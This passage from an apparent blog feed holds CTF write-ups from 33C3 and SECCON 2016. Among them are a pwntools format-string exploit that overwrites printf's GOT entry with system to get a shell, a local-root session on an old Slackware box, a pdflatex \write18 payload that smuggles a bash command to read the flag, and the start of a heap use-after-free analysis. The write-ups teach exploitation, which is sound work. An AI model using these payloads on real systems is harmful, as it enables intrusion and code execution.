locate the <code>.got.plt</code> area:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">Dynamic section at offset 0xe28 contains 24 entries:</span><br><span class="line">  Tag        Type                         Name/Value</span><br><span class="line"> 0x0000000000000001 (NEEDED)             Shared library: [libc.so.6]</span><br><span class="line"> 0x000000000000000c (INIT)               0x400400</span><br><span class="line"> 0x000000000000000d (FINI)               0x400614</span><br><span class="line"> 0x0000000000000019 (INIT_ARRAY)         0x600e10</span><br><span class="line"> 0x000000000000001b (INIT_ARRAYSZ)       8 (bytes)</span><br><span class="line"> 0x000000000000001a (FINI_ARRAY)         0x600e18</span><br><span class="line"> 0x000000000000001c (FINI_ARRAYSZ)       8 (bytes)</span><br><span class="line"> 0x000000006ffffef5 (GNU_HASH)           0x400298</span><br><span class="line"> 0x0000000000000005 (STRTAB)             0x400330</span><br><span class="line"> 0x0000000000000006 (SYMTAB)             0x4002b8</span><br><span class="line"> 0x000000000000000a (STRSZ)              68 (bytes)</span><br><span class="line"> 0x000000000000000b (SYMENT)             24 (bytes)</span><br><span class="line"> 0x0000000000000015 (DEBUG)              0x0</span><br><span class="line"> 0x0000000000000003 (PLTGOT)             0x601000  &lt;--- here</span><br></pre></td></tr></table></figure></p><figure class="highlight python"><figcaption><span>resolve PLTGOT</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">cnt = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">    addr = dynamic_ptr + <span class="number">0x10</span>*cnt</span><br><span class="line">    ret = leak(addr)</span><br><span class="line">    <span class="keyword">if</span> ret == <span class="string">"\x03\x00"</span>: <span class="comment">#TYPE PLTGOT</span></span><br><span class="line">        addr += <span class="number">8</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">8</span>):</span><br><span class="line">            ret = leak(addr+i)</span><br><span class="line">            <span class="keyword">print</span> <span class="string">"ret:"</span>, ret.encode(<span class="string">'hex'</span>)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        cnt += <span class="number">1</span></span><br></pre></td></tr></table></figure><p>Now we can find where <code>printf@got.plt</code> is, by leaking all the GOT entry and compare the low 12 bits of the function address (see if it ends with <code>550</code>):<br><figure class="highlight python"><figcaption><span>resolve printf@got.plt</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">got = <span class="number">0x601000</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">8</span>):</span><br><span class="line">    addr = got + i*<span class="number">8</span></span><br><span class="line">    ret = leak(addr)</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"ret:"</span>, ret.encode(<span class="string">'hex'</span>)</span><br></pre></td></tr></table></figure></p><p>Finally, we can start exploiting the service:<br><figure class="highlight python"><figcaption><span>exp_espr.py</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">HOST = <span class="string">"78.46.224.86"</span></span><br><span class="line">PORT = <span class="number">1337</span></span><br><span class="line"><span class="comment"># setting </span></span><br><span class="line">context.arch = <span class="string">'amd64'</span></span><br><span class="line">context.os = <span class="string">'linux'</span></span><br><span class="line">context.endian = <span class="string">'little'</span></span><br><span class="line">context.word_size = <span class="number">32</span></span><br><span class="line"><span class="comment"># ['CRITICAL', 'DEBUG', 'ERROR', 'INFO', 'NOTSET', 'WARN', 'WARNING']</span></span><br><span class="line">context.log_level = <span class="string">'INFO'</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leak</span><span class="params">(addr)</span>:</span></span><br><span class="line">    payload = <span class="string">"%7$s.AAA"</span>+p64(addr)</span><br><span class="line">    r.sendline(payload)</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"leaking:"</span>, hex(addr)</span><br><span class="line">    resp = r.recvuntil(<span class="string">".AAA"</span>)</span><br><span class="line">    ret = resp[:<span class="number">-4</span>:] + <span class="string">"\x00"</span></span><br><span class="line">    <span class="keyword">print</span> <span class="string">"ret:"</span>, repr(ret)</span><br><span class="line">r.recvrepeat(<span class="number">0.2</span>)</span><br><span class="line">    <span class="keyword">return</span> ret</span><br><span class="line">    </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line"></span><br><span class="line">    r = remote(HOST, PORT)</span><br><span class="line"></span><br><span class="line">    printf_got = <span class="number">0x601018</span></span><br><span class="line">    printf_addr = u64(leak(printf_got).ljust(<span class="number">8</span>, <span class="string">"\x00"</span>))</span><br><span class="line">    system_addr = printf_addr - <span class="number">0x10e80</span> <span class="comment"># remote</span></span><br><span class="line"></span><br><span class="line">    log.success(<span class="string">"printf_addr: "</span>+hex(printf_addr))</span><br><span class="line">    log.success(<span class="string">"system_addr: "</span>+hex(system_addr))</span><br><span class="line"></span><br><span class="line">    byte1 = system_addr &amp; <span class="number">0xff</span></span><br><span class="line">    byte2 = (system_addr &amp; <span class="number">0xffff00</span>) &gt;&gt; <span class="number">8</span></span><br><span class="line">    log.success(<span class="string">"byte1: "</span>+hex(byte1))</span><br><span class="line">    log.success(<span class="string">"byte2: "</span>+hex(byte2))</span><br><span class="line"></span><br><span class="line">    payload = <span class="string">"%"</span> + str(byte1) + <span class="string">"c"</span> + <span class="string">"%10$hhn."</span></span><br><span class="line">    payload += <span class="string">"%"</span> + str(byte2-byte1<span class="number">-1</span>) + <span class="string">"c"</span> + <span class="string">"%11$hn."</span></span><br><span class="line">    payload = payload.ljust(<span class="number">32</span>, <span class="string">"A"</span>)</span><br><span class="line">    payload += p64(printf_got) + p64(printf_got+<span class="number">1</span>)</span><br><span class="line">    r.sendline(payload)</span><br><span class="line">    r.sendline(<span class="string">"sh\x00"</span>)</span><br><span class="line">    r.interactive()</span><br></pre></td></tr></table></figure></p><p>flag: <code>33C3_f1rst_tshirt_challenge?!</code></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;strong&gt;Category:&lt;/strong&gt; pwn&lt;br&gt;&lt;strong&gt;Points:&lt;/strong&gt; 150&lt;/p&gt;
    
    </summary>
    
      <category term="write-ups" scheme="https://bruce30262.github.io/categories/write-ups/"/>
    
    
      <category term="CTF" scheme="https://bruce30262.github.io/tags/CTF/"/>
    
      <category term="Pwnable" scheme="https://bruce30262.github.io/tags/Pwnable/"/>
    
      <category term="Python" scheme="https://bruce30262.github.io/tags/Python/"/>
    
      <category term="format_string" scheme="https://bruce30262.github.io/tags/format-string/"/>
    
      <category term="33C3" scheme="https://bruce30262.github.io/tags/33C3/"/>
    
  </entry>
  
  <entry>
    <title>33C3 CTF 2016 -- The 0x90s called</title>
    <link href="https://bruce30262.github.io/2016/12/29/2016-12-29-33c3-ctf-2016-the-0x90s-called/"/>
    <id>https://bruce30262.github.io/2016/12/29/2016-12-29-33c3-ctf-2016-the-0x90s-called/</id>
    <published>2016-12-29T13:40:00.000Z</published>
    <updated>2018-01-03T15:08:05.599Z</updated>
    
    <content type="html"><![CDATA[<p><strong>Category:</strong> pwn<br><strong>Points:</strong> 150</p><a id="more"></a>  <p>First we’ll have to go to a web page to start our challenge session. The page will show us the port (same IP address with the web page) and the ID/password.</p><p>Once we connected to the remote host and login the machine, we’ll found that we’re inside a <a href="http://www.slackware.com/" target="_blank" rel="noopener">Slackware Linux</a>:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">$ nc 78.46.224.70 2323</span><br><span class="line"></span><br><span class="line">Welcome to Linux 0.99pl12.</span><br><span class="line"></span><br><span class="line">slack login: challenge</span><br><span class="line">Password:challenge</span><br><span class="line"></span><br><span class="line">Linux 0.99pl12. (Posix).</span><br><span class="line">No mail.</span><br><span class="line">slack:~$ uname -a</span><br><span class="line">Linux slack 0.99.12 #6 Sun Aug 8 16:02:35 CDT 1993 i586</span><br></pre></td></tr></table></figure></p><p>Later we’ll found that there’s a <code>flag.txt</code> inside the root directory:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">slack:/$ ls -al /flag.txt</span><br><span class="line">-r--------   1 root     root           36 Dec 27  1916 /flag.txt</span><br></pre></td></tr></table></figure></p><p>Looks like we’ll need a local root exploit to capture the flag. </p><p>By googling <strong>“slackware linux 0.99 local root exploit”</strong>, we found a working <a href="https://github.com/HackerFantastic/Public/blob/master/exploits/prdelka-vs-GNU-lpr.c" target="_blank" rel="noopener">PoC</a>. Now all we need to do is copy the PoC to the remote host, then compile &amp; execute the exploit so we can escalate to root.</p><p>Although it looks simple, it still took me a while to complete the challenge, since there’s no tool that can help us download the PoC to the host – <strong>no <code>wget</code>, no <code>curl</code>, not even <code>nc</code>!!</strong> And the <code>vi</code> editor is just terrible!! Finally I decided to use <code>cat &lt;&lt;&#39;EOF&#39; &gt;&gt; test.c</code> + copy &amp; paste to write the exploit into <code>test.c</code>.</p><p>After we compile &amp; execute the local root exploit, we’re able to escalate to root and get the flag:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">slack:~$ gcc -o test test.c</span><br><span class="line">slack:~$ ./test</span><br><span class="line">[ Slackware linux 1.01 /usr/bin/lpr local root exploit</span><br><span class="line"># id</span><br><span class="line">id</span><br><span class="line">uid=405(challenge) gid=1(other) euid=0(root) egid=18(lp)</span><br><span class="line"># cat /flag.txt</span><br><span class="line">cat /flag.txt</span><br><span class="line">33C3_Th3_0x90s_w3r3_pre3tty_4w3s0m3</span><br></pre></td></tr></table></figure></p><p>flag: <code>33C3_Th3_0x90s_w3r3_pre3tty_4w3s0m3</code></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;strong&gt;Category:&lt;/strong&gt; pwn&lt;br&gt;&lt;strong&gt;Points:&lt;/strong&gt; 150&lt;/p&gt;
    
    </summary>
    
      <category term="write-ups" scheme="https://bruce30262.github.io/categories/write-ups/"/>
    
    
      <category term="CTF" scheme="https://bruce30262.github.io/tags/CTF/"/>
    
      <category term="Pwnable" scheme="https://bruce30262.github.io/tags/Pwnable/"/>
    
      <category term="33C3" scheme="https://bruce30262.github.io/tags/33C3/"/>
    
      <category term="local_root" scheme="https://bruce30262.github.io/tags/local-root/"/>
    
  </entry>
  
  <entry>
    <title>33C3 CTF 2016 -- pdfmaker</title>
    <link href="https://bruce30262.github.io/2016/12/29/2016-12-29-1255893/"/>
    <id>https://bruce30262.github.io/2016/12/29/2016-12-29-1255893/</id>
    <published>2016-12-29T13:05:00.000Z</published>
    <updated>2018-01-03T15:08:05.599Z</updated>
    
    <content type="html"><![CDATA[<p><strong>Category:</strong> Misc<br><strong>Points:</strong> 75</p><blockquote><p>Just a tiny <a href="https://gist.github.com/bruce30262/80b089e24d3a34862fe78892c63d8dcf" target="_blank" rel="noopener">application</a>, that lets the user write some files and compile them with pdflatex.<br>What can possibly go wrong?<br>nc 78.46.224.91 24242</p></blockquote><a id="more"></a>  <p>So this is a service that allow us to create, show &amp; compile some files.</p><ul><li><code>create</code>: Create a file. Valid file format are: <code>.log</code>, <code>.tex</code>, <code>.mb</code>, <code>.sty</code> &amp; <code>.bib</code></li><li><code>show</code>: Show the file content.</li><li><code>compile</code>: Compile a file with the <code>pdflatex</code> command.</li></ul><p>We started by googling the key word <strong>“pdflatex exploit”</strong>, then teammate <strong>mike</strong> found a useful link: <a href="http://scumjr.github.io/2016/11/28/pwning-coworkers-thanks-to-latex/" target="_blank" rel="noopener">Pwning coworkers thanks to LaTeX</a></p><p>Basically we just need to follow the method mentioned in the post:</p><ol><li>Create a <code>.mp</code> file</li><li>Create a <code>.tex</code> file with the malicious content. Here we change the command to <code>(cat${IFS}$(ls|grep${IFS}33C3))&gt;qqq.log</code>, which will later store the flag content into <code>qqq.log</code></li><li>Compile the <code>.tex</code> file. This will cause <code>pdflatext</code> execute our command</li><li>Show the <code>qqq.log</code> file and get the flag</li></ol><p>Here’s our final exploit:</p><figure class="highlight plain"><figcaption><span>sss.mp</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">verbatimtex</span><br><span class="line">\documentclass&#123;minimal&#125;\begin&#123;document&#125;</span><br><span class="line">etex beginfig (1) label(btex blah etex, origin);</span><br><span class="line">endfig; \end&#123;document&#125; bye</span><br></pre></td></tr></table></figure><figure class="highlight plain"><figcaption><span>aaa.tex</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">\documentclass&#123;article&#125;\begin&#123;document&#125;</span><br><span class="line">\immediate\write18&#123;mpost -ini &quot;-tex=bash -c (cat$&#123;IFS&#125;$(ls|grep$&#123;IFS&#125;33C3))&gt;qqq.log&quot; &quot;sss.mp&quot;&#125;</span><br><span class="line">\end&#123;document&#125;</span><br></pre></td></tr></table></figure><figure class="highlight python"><figcaption><span>exp.py</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">"78.46.224.91"</span>, <span class="number">24242</span>)</span><br><span class="line"></span><br><span class="line">log.info(<span class="string">"creating sss.mp..."</span>)</span><br><span class="line">r.sendlineafter(<span class="string">"&gt;"</span>, <span class="string">"create mp sss"</span>)</span><br><span class="line">r.recvline()</span><br><span class="line">f = open(<span class="string">"sss.mp"</span>, <span class="string">"r"</span>)</span><br><span class="line"><span class="keyword">for</span> line <span class="keyword">in</span> f:</span><br><span class="line">    r.sendline(line.strip())</span><br><span class="line">r.sendline(<span class="string">"\q"</span>)</span><br><span class="line">f.close()</span><br><span class="line"></span><br><span class="line">log.info(<span class="string">"creating aaa.tex..."</span>)</span><br><span class="line">r.sendlineafter(<span class="string">"&gt;"</span>, <span class="string">"create tex aaa"</span>)</span><br><span class="line">r.recvline()</span><br><span class="line">f = open(<span class="string">"aaa.tex"</span>, <span class="string">"r"</span>)</span><br><span class="line"><span class="keyword">for</span> line <span class="keyword">in</span> f:</span><br><span class="line">    r.sendline(line.strip())</span><br><span class="line">r.sendline(<span class="string">"\q"</span>)</span><br><span class="line">f.close()</span><br><span class="line"></span><br><span class="line">r.sendlineafter(<span class="string">"&gt;"</span>, <span class="string">"compile aaa"</span>)</span><br><span class="line">r.sendlineafter(<span class="string">"&gt;"</span>, <span class="string">"show log qqq"</span>)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><p><strong>Don’t take LaTEX files from strangers!!</strong></p><p>flag: <code>33C3_pdflatex_1s_t0t4lly_s3cur3!</code></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;strong&gt;Category:&lt;/strong&gt; Misc&lt;br&gt;&lt;strong&gt;Points:&lt;/strong&gt; 75&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;Just a tiny &lt;a href=&quot;https://gist.github.com/bruce30262/80b089e24d3a34862fe78892c63d8dcf&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;application&lt;/a&gt;, that lets the user write some files and compile them with pdflatex.&lt;br&gt;What can possibly go wrong?&lt;br&gt;nc 78.46.224.91 24242&lt;/p&gt;
&lt;/blockquote&gt;
    
    </summary>
    
      <category term="write-ups" scheme="https://bruce30262.github.io/categories/write-ups/"/>
    
    
      <category term="CTF" scheme="https://bruce30262.github.io/tags/CTF/"/>
    
      <category term="Python" scheme="https://bruce30262.github.io/tags/Python/"/>
    
      <category term="Misc" scheme="https://bruce30262.github.io/tags/Misc/"/>
    
      <category term="33C3" scheme="https://bruce30262.github.io/tags/33C3/"/>
    
      <category term="pdflatext" scheme="https://bruce30262.github.io/tags/pdflatext/"/>
    
  </entry>
  
  <entry>
    <title>SECCON CTF 2016 -- chat</title>
    <link href="https://bruce30262.github.io/2016/12/12/2016-12-12-seccon-ctf-2016-chat/"/>
    <id>https://bruce30262.github.io/2016/12/12/2016-12-12-seccon-ctf-2016-chat/</id>
    <published>2016-12-12T00:03:00.000Z</published>
    <updated>2018-01-03T15:08:05.599Z</updated>
    
    <content type="html"><![CDATA[<p><strong>Category:</strong> Exploit<br><strong>Points:</strong> 500</p><a id="more"></a>  <p>64 bit ELF with Partial RELRO, stack canary &amp; NX enabled, No PIE.  </p><p>The program is a simple tweet-chat service:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">$ ./chat</span><br><span class="line">Simple Chat Service</span><br><span class="line"></span><br><span class="line">1 : Sign Up     2 : Sign In</span><br><span class="line">0 : Exit</span><br><span class="line">menu &gt; 1</span><br><span class="line">name &gt; userA</span><br><span class="line">Success!</span><br><span class="line"></span><br><span class="line">1 : Sign Up     2 : Sign In</span><br><span class="line">0 : Exit</span><br><span class="line">menu &gt; 1</span><br><span class="line">name &gt; userB</span><br><span class="line">Success!</span><br><span class="line"></span><br><span class="line">1 : Sign Up     2 : Sign In</span><br><span class="line">0 : Exit</span><br><span class="line">menu &gt; 2</span><br><span class="line">name &gt; userA</span><br><span class="line">Hello, userA!</span><br><span class="line">Success!</span><br><span class="line"></span><br><span class="line">Service Menu</span><br><span class="line"></span><br><span class="line">1 : Show TimeLine       2 : Show DM     3 : Show UsersList</span><br><span class="line">4 : Send PublicMessage  5 : Send DirectMessage</span><br><span class="line">6 : Remove PublicMessage                7 : Change UserName</span><br><span class="line">0 : Sign Out</span><br><span class="line">menu &gt;&gt; 5</span><br><span class="line">name &gt;&gt; userB</span><br><span class="line">message &gt;&gt; from a</span><br><span class="line">Done.</span><br></pre></td></tr></table></figure></p><p>As we can see the service allow us to sign up users, sign in and tweet message (send public message). We can also DM other users. In the above example, after <code>userA</code> send a message to <code>userB</code>, we can sign in as <code>userB</code> and check the DM:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">1 : Sign Up     2 : Sign In</span><br><span class="line">0 : Exit</span><br><span class="line">menu &gt; 2</span><br><span class="line">name &gt; userB</span><br><span class="line">Hello, userB!</span><br><span class="line">Success!</span><br><span class="line"></span><br><span class="line">Service Menu</span><br><span class="line"></span><br><span class="line">1 : Show TimeLine       2 : Show DM     3 : Show UsersList</span><br><span class="line">4 : Send PublicMessage  5 : Send DirectMessage</span><br><span class="line">6 : Remove PublicMessage                7 : Change UserName</span><br><span class="line">0 : Sign Out</span><br><span class="line">menu &gt;&gt; 2</span><br><span class="line">Direct Messages</span><br><span class="line">[userA] from a</span><br><span class="line">Done.</span><br></pre></td></tr></table></figure></p><p>It will print the sender’s name and its message. </p><p>Users and messages are stored in the program with two different kinds of data structures:<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">user</span> &#123;</span></span><br><span class="line">    <span class="keyword">char</span> *name;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">message</span> *<span class="title">msg</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">user</span> *<span class="title">next_user</span>;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">message</span> &#123;</span></span><br><span class="line">    <span class="keyword">int</span> id ; <span class="comment">// use in tweet (public message) only</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">user</span> *<span class="title">sender</span>;</span></span><br><span class="line">    <span class="keyword">char</span> content[<span class="number">128</span>];</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">message</span> *<span class="title">next_msg</span>;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>Notice that there’s some limitations while setting <code>user-&gt;name</code>: the maximum name length is 32, and <strong>the first character must be a printable character</strong> (check by the <a href="http://www.cplusplus.com/reference/cctype/isprint/" target="_blank" rel="noopener">isprint</a> function). This effects the functionality of the <code>Change UserName</code> : If you change a user’s name, and the new name isn’t a valid user name, <strong>it will remove the user</strong>. </p><p>So what if we remove a user after we send a DM to another user?</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">1 : Sign Up     2 : Sign In</span><br><span class="line">0 : Exit</span><br><span class="line">menu &gt; 2</span><br><span class="line">name &gt; userA</span><br><span class="line">Hello, userA!</span><br><span class="line">Success!</span><br><span class="line"></span><br><span class="line">Service Menu</span><br><span class="line"></span><br><span class="line">1 : Show TimeLine       2 : Show DM     3 : Show UsersList</span><br><span class="line">4 : Send PublicMessage  5 : Send DirectMessage</span><br><span class="line">6 : Remove PublicMessage                7 : Change UserName</span><br><span class="line">0 : Sign Out</span><br><span class="line">menu &gt;&gt; 7</span><br><span class="line">name &gt;&gt;            &lt;-- here we input &apos;\t&apos;, which did not pass the isprint check</span><br><span class="line">Change name error...</span><br><span class="line">Bye, </span><br><span class="line"></span><br><span class="line">1 : Sign Up     2 : Sign In</span><br><span class="line">0 : Exit</span><br><span class="line">menu &gt; 2</span><br><span class="line">name &gt; userB</span><br><span class="line">Hello, userB!</span><br><span class="line">Success!</span><br><span class="line"></span><br><span class="line">Service Menu</span><br><span class="line"></span><br><span class="line">1 : Show TimeLine       2 : Show DM     3 : Show UsersList</span><br><span class="line">4 : Send PublicMessage  5 : Send DirectMessage</span><br><span class="line">6 : Remove PublicMessage                7 : Change UserName</span><br><span class="line">0 : Sign Out</span><br><span class="line">menu &gt;&gt; 2</span><br><span class="line">Direct Messages</span><br><span class="line">[] from a       &lt;-- strange sender&apos;s name</span><br><span class="line">Done.</span><br></pre></td></tr></table></figure><p>We can see that if we show <code>userB</code>‘s DM after we remove <code>userA</code>, the sender’s name will become a strange value. This is because while removing <code>userA</code>, it will free the <code>userA-&gt;name</code> pointer, but the program is still able to access the pointer by showing <code>userB</code>‘s DM <strong>( accessing <code>userB-&gt;messsage-&gt;sender-&gt;name</code> )</strong>. A typical Use-After-Free vulnerability.</p><p>So now there’s a dangling pointer in the program. If we can arrange the heap memory chunk carefully, and make a user’s name buffer overlapped with <code>userB-&gt;messsage-&gt;sender</code>:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">                       +--------------+</span><br><span class="line">userB-&gt;message-&gt;sender | char *p_name | userC-&gt;name</span><br><span class="line">                       |              |</span><br><span class="line">                       +----+---------+</span><br><span class="line">                            |</span><br><span class="line">            +---------------+</span><br><span class="line">            |</span><br><span class="line">            |          +-----------+</span><br><span class="line">            +-&gt; p_name |sender_name|</span><br><span class="line">                       |    .      |</span><br><span class="line">                       |    .      |</span><br><span class="line">                       |    .      |</span><br><span class="line">                       +-----------+</span><br></pre></td></tr></table></figure></p><p>We can then modify the value of pointer <code>p_name</code> by editing <code>userC-&gt;name</code>, and then leak some address by viewing <code>userB</code>‘s DM ( sender’s name ). This can be done easily if you’re familiar with the glibc malloc’s fastbin allocation. By changing <code>p_name</code> into <code>__libc_start_main@got.plt</code> ( <code>0x603040</code>, which its first character is <code>0x40</code>, a printable character ), we can then leak the libc’s base address. </p><p>Now we still need to find a way to do the “write-anywhere” attack. It’s kind of hard to find such vulnerability by just reversing the binary, so I decided to start fuzzing the binary, while examine the heap memory at the same time. Finally ( and luckily ! ), I notice that I’ve made the heap memory chunk arranged like this:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">          +--------------+</span><br><span class="line">0x1234050 |              | userC-&gt;name</span><br><span class="line">          +--------------+</span><br><span class="line">          |              |</span><br><span class="line">          +--------------+</span><br><span 